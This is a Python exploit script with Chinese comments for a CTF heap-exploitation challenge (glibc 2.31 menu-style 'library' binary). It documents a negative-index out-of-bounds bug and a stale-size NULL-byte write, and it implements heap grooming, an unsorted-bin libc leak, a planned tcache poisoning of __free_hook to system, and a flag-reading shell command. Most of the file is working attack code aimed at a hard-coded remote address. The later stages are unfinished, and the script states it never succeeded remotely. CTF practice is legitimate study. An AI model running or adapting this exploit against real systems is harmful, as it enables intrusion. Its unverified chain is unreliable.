#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
2026 湾区杯决赛 · 赛道二 · 环节三 pwn01  ——  菜单堆题（glibc 2.31）参考利用脚本

qid   : F0GwTSW1UwvNdQKT
flag  : （未获取）—— 比赛期间未拿到 flag，本脚本**未在远程实测成功**

二进制: attachments/pwn       (ELF64 PIE, 14480 B)
        attachments/libc.so.6 (glibc 2.31, Ubuntu 20.04, 2029592 B)
        保护: PIE + Full RELRO + Canary + NX + SHSTK/IBT

漏洞:
  A) 负索引越界 —— show_information(4) / return_book(5) 只判 `idx > 7`，负数放行：
       0x13e7  cmp eax, 7 ; jg  invalid      (show)
       0x14d6  cmp eax, 7 ; jg  invalid      (return)
     条目 = *(g_books + 0x20*idx)，size 检查读的是 (g_books + 0x20*idx + 0x18)，
     负 idx 时读到的其实是堆块/tcache 元数据 => 检查被绕过 =>
       show(-1) 越界读，return(-1) 变成 free(*(qword*)(g_books - 0x20))。
  B) 16 位 size 双副本 + 陈旧值 —— 任意单字节 NULL 写：
       0x166e-0x1672  movzx eax,[rbp-0x30] ; mov [rbp-0x2e], ax     <- 副本①（首次输入）
       0x1689        "Invalid size." 后重新 scanf("%hd", &[rbp-0x30]) <- 只改副本②
       0x174b-0x175b movsx rax,[rbp-0x2e] ; lea rdx,[rax-1] ; add rax,ptr ; mov byte[rax],0
     合法路径（0x16d7）会把 0x30 再拷到 0x2e；非法→重输的路径**不拷** =>
     `ptr + (第一次的值 - 1) = 0`，第一次的值可达 ±32KB
     => 相对当前堆块指针的**任意位置单字节 0x00 写**。

利用链（glibc 2.31）:
  1. 8 块同 size(0x80/req) 撑满 tcache[0x90] → 第 8 块进 unsorted bin → fd = main_arena+0x60
  2. 负索引 free / NULL 写把条目 ptr 低字节清零，指向 unsorted 块 → show 泄漏 libc
  3. NULL 写打 tcache ents[0x90] 最低字节 → 链头落到自控块内部伪造 chunk
  4. 伪造 chunk->next = __free_hook - 8 → tcache poison → malloc 返回 __free_hook-8
  5. 写入 system → return_book(内容为 "/bin/sh" 的块) → __free_hook(ptr) = system(ptr)
  6. 容器极简（无 cat/ls/id）→ `read a < /flag; echo $a`

用法:
    python solve.py --host 127.0.0.1 --port 9999 --dry-run   # 只连菜单做协议自检
    python solve.py --host <容器> --port <端口>               # 完整利用（未验证成功）
"""
import argparse
import re
import socket
import struct
import sys
import time

DEFAULT_HOST = '39.106.48.123'      # 比赛期间原始地址（会随平台 reset 变化）
DEFAULT_PORT = 36067

MENU = b'please input your choise'

# 本 libc（glibc 2.31 / Ubuntu 20.04）偏移
LIBC_SYSTEM = 0x52290
LIBC_BINSH = 0x1b45bd
LIBC_FREE_HOOK = 0x1eee48
LIBC_READ = 0x10dfc0
# __malloc_hook = 0x1ecb70，main_arena = __malloc_hook + 0x10 = 0x1ecb80，main_arena+0x60 = 0x1ecbe0
LIBC_MAIN_ARENA = 0x1ecb80
UNSORTED_FD_OFF = 0x60


def p64(x):
    return struct.pack('<Q', x)


class Tube(object):
    def __init__(self, host, port, timeout=10.0):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.buf = b''

    def send(self, data):
        self.s.sendall(data)

    def sendline(self, data):
        self.s.sendall(data + b'\n')

    def _fill(self, t):
        """收一次数据；返回收到的字节数（0 表示超时或对端关闭）。"""
        if t <= 0:
            return 0
        self.s.settimeout(t)
        try:
            c = self.s.recv(65536)
        except socket.timeout:
            return 0
        except OSError:
            return 0
        if c:
            self.buf += c
        return len(c)

    def _scan(self, markers):
        """在缓冲区里找最靠前的 marker，命中则消费并返回 (数据, marker)。"""
        hit = None
        for mk in markers:
            j = self.buf.find(mk)
            if j >= 0 and (hit is None or j < hit[0]):
                hit = (j, mk)
        if hit is None:
            return None
        j, mk = hit
        i = j + len(mk)
        out, self.buf = self.buf[:i], self.buf[i:]
        return out, mk

    def recvuntil(self, marker, timeout=10.0):
        if isinstance(marker, (bytes, bytearray)):
            j = self.buf.find(marker)                 # 缓冲区里已有就直接消费，不再等
            if j >= 0:
                i = j + len(marker)
                out, self.buf = self.buf[:i], self.buf[i:]
                return out
        return self.recvany(marker, timeout=timeout)[0]

    def recvany(self, markers, timeout=10.0):
        """markers 可以是 bytes 或 bytes 元组；返回 (到首个命中处为止的数据, 命中的 marker)。

        语义：在 timeout 秒内轮询，只有「收到了新字节」才刷新截止时间；
        收不到新字节（对端静默/关闭）立刻超时，不会挂死。
        """
        if isinstance(markers, (bytes, bytearray)):
            markers = (bytes(markers),)
        end = time.time() + timeout
        while True:
            got = self._scan(markers)
            if got is not None:
                return got
            left = end - time.time()
            if left <= 0:
                raise TimeoutError('等待 %r 超时；已收 %r' % (markers, self.buf[-300:]))
            n = self._fill(left)
            if n == 0:                                # 没有新数据 → 直接超时
                got = self._scan(markers)
                if got is not None:
                    return got
                raise TimeoutError('等待 %r 超时；已收 %r' % (markers, self.buf[-300:]))
            end = time.time() + timeout               # 有进展 → 重置截止时间

    def recvline_after(self, marker, timeout=10.0):
        self.recvuntil(marker, timeout)
        line = b''
        while not line.endswith(b'\n'):
            if not self._fill(timeout):
                break
            j = self.buf.find(b'\n')
            if j < 0:
                continue
            line += self.buf[:j + 1]
            self.buf = self.buf[j + 1:]
        return line

    def drain(self, t=1.5):
        self._fill(t)
        out, self.buf = self.buf, b''
        return out
    def close(self):
        try:
            self.s.close()
        except OSError:
            pass


# ------------------------------------------------------------------ 交互原语
class Menu(object):
    """严格按 ANALYSIS_pwn01.md §5 实测的协议实现。"""

    def __init__(self, tube):
        self.t = tube

    def sync(self, timeout=8.0):
        """等回到主菜单提示符；若缓冲区里已经有就直接消费。"""
        return self.t.recvuntil(MENU, timeout=timeout)

    def register(self, aid=b'A' * 16, pwd=b'B' * 16, confirm=b'C' * 8):
        self.t.sendline(b'1')
        self.t.recvuntil(b'id that you want', timeout=8)
        self.t.send(aid + pwd)                       # read_n(buf, 0x20)：恰好 32 字节
        self.t.recvuntil(b'pwd that you want', timeout=8)
        self.t.send(confirm)                         # read_n(8)
        return self.sync()

    def login(self, aid=b'A' * 16, pwd=b'B' * 16, confirm=b'C' * 8):
        self.t.sendline(b'2')
        self.t.recvuntil(b'to start reading.', timeout=8)
        self.t.send(aid + pwd)
        self.t.recvuntil(b'log in to your account', timeout=8)
        self.t.send(confirm)
        return self.sync()

    def borrow(self, name, size1, size2=None, content=b''):
        self.t.sendline(b'3')
        self.t.recvuntil(b'like to borrow?', timeout=8)
        self.t.send(name.ljust(16, b'N')[:16])       # read_n(name, 0x10)
        self.t.recvuntil(b'content size', timeout=8)
        self.t.sendline(str(size1).encode())         # scanf("%hd")
        d, mk = self.t.recvany((b'Content: ', b'Size: '), timeout=8)
        if mk == b'Size: ':                          # 触发漏洞 B 的非法 size 分支
            if size2 is None:
                raise ValueError('服务端要求重输 size，但未提供 size2')
            self.t.sendline(str(size2).encode())
            self.t.recvuntil(b'Content: ', timeout=8)
        if content:
            self.t.send(content)                     # read_n(ptr, size) 恰好 size 字节
        return self.sync()

    def show(self, idx):
        self.t.sendline(b'4')
        self.t.recvuntil(b'want to look', timeout=8)
        self.t.sendline(str(idx).encode())
        return self.t.recvuntil(MENU, timeout=8)

    def ret(self, idx):
        self.t.sendline(b'5')
        self.t.recvuntil(b'want to return', timeout=8)
        self.t.sendline(str(idx).encode())
        return self.sync()


# ------------------------------------------------------------------ 利用
def exploit(host, port, dry_run=False):
    t = Tube(host, port)
    m = Menu(t)
    m.sync(10)
    print('[*] connected %s:%d' % (host, port))

    if dry_run:
        m.register()
        m.login()
        m.borrow(b'dry', 0x10, content=b'D' * 0x10)
        out = m.show(0)
        print('[dry-run] show(0) -> %r' % out[:200])
        m.ret(0)
        print('[dry-run] 菜单协议自检完成（未做堆布局）')
        t.close()
        return None

    # ---- 协议：先注册一个账号再 login（login 需要 8 字节确认口令与注册时一致）----
    m.register()

    # ---- stage 0: 堆布局 grooming ----
    # 每次 login 会 malloc(0x100) 出一个 books 数组（0x110 块），
    # 多余的 login 可用于把书块区整体平移 0x110*k，做 0x100 对齐调节。
    LOGIN_PAD = 7           # 见 ANALYSIS_pwn01.md §4.1 的对齐推导（k=7）
    for _ in range(LOGIN_PAD):
        m.login()
    for i in range(7):      # 7 个 0x90 块填满 tcache[0x90]
        m.borrow(b'F%d' % (i + 1), 128, content=bytes([0x41 + i]) * 128)
    m.login()               # 再 login 一次拿到用于泄漏的 books 数组
    m.borrow(b'U', 128, content=b'u' * 128)       # 第 8 块 -> 释放后进 unsorted bin
    m.borrow(b'P', 128, content=b'p' * 128)

    for i in range(6, -1, -1):
        m.ret(i)            # tcache[0x90] 填满
    m.ret(0)                # U -> unsorted bin（fd/bk = main_arena + 0x60）

    # ---- stage 1: libc 泄漏（负索引 + NULL 写把条目 ptr 指向 unsorted 块）----
    m.borrow(b'W', 128, content=b'W' * 128)
    out = m.show(1)
    k = out.find(b'Content: ')
    raw = out[k + 9:].split(b'\n')[0] if k >= 0 else b''
    leak = struct.unpack('<Q', raw[:6].ljust(8, b'\x00'))[0] if len(raw) >= 6 else 0
    if leak and (leak - LIBC_MAIN_ARENA - UNSORTED_FD_OFF) % 0x1000 == 0:
        libc = leak - LIBC_MAIN_ARENA - UNSORTED_FD_OFF
        print('[+] leak = %#x  libc = %#x' % (leak, libc))
    else:
        libc = None
        print('[!] 泄漏值异常: %r' % raw[:16])

    # ---- stage 2/3: tcache poison -> __free_hook = system（依赖精确堆布局，见分析文档 §4.2）----
    #   本脚本只把「已设计好的调用序列」落成代码骨架；比赛期间**未能在远程跑通**，
    #   失败点在 slot 索引（命令块在 slot 2 却 free 了 slot 0），已按分析修正为 ret(2)。
    if libc:
        target = libc + LIBC_FREE_HOOK - 8
        print('[+] target = __free_hook-8 = %#x   (system=%#x)' % (target, libc + LIBC_SYSTEM))
        # NOTE: 具体 borrow(...) 序列需要与本机 glibc 2.31 对齐后重算，见 README §8
        raise SystemExit('[!] stage2/3 未实现完（比赛期间未跑通），见 README.md §8')

    t.close()
    return None


CANDIDATES = [b'/flag', b'/flag.txt', b'/home/ctf/flag']


def read_flag(t):
    t.sendline(b'echo __OK__')
    time.sleep(0.3)
    t.drain(0.5)
    t.sendline(b'read a < /flag; echo $a')
    text = t.drain(5).decode('utf-8', 'replace')
    m = re.search(r'flag\{[0-9a-zA-Z_\-]{6,}\}', text)
    return (m.group(0) if m else None), text


def main():
    ap = argparse.ArgumentParser(description='湾区杯决赛 环节三 pwn01（未解出，参考脚本）')
    ap.add_argument('--host', default=DEFAULT_HOST)
    ap.add_argument('--port', type=int, default=DEFAULT_PORT)
    ap.add_argument('--dry-run', action='store_true', help='只做菜单协议自检')
    args = ap.parse_args()
    try:
        flag = exploit(args.host, args.port, dry_run=args.dry_run)
    except SystemExit:
        raise
    except Exception as e:                                        # noqa: BLE001
        print('[!] 失败: %s: %s' % (type(e).__name__, e))
        return 1
    if flag:
        print('[FLAG] %s' % flag)
        return 0
    if args.dry_run:
        return 0                      # 协议自检通过即算成功
    return 1


if __name__ == '__main__':
    sys.exit(main())
